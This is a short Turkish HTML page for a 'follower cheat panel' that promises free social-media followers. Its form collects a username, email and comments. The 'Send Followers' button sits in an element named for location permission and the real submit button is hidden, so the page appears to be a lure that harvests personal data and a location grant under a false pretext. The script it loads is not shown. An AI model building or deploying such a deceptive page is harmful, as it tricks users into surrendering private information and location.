<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Takipçi Hilesi Paneli</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div id="container">
        <h1>Takipçi Hilesi Paneli</h1>
        <form id="form">
            <input type="text" id="username" placeholder="Kullanıcı Adı" required>
            <input type="email" id="email" placeholder="E-Posta" required>
            <textarea id="feedback" placeholder="Yorumlarınızı buraya yazın" required></textarea>
            <div id="locationPermission">
                <button type="button" id="locationButton">Takipçi Gönder</button>
            </div>
            <button type="submit" id="submitBtn" style="display:none;">Gönder</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
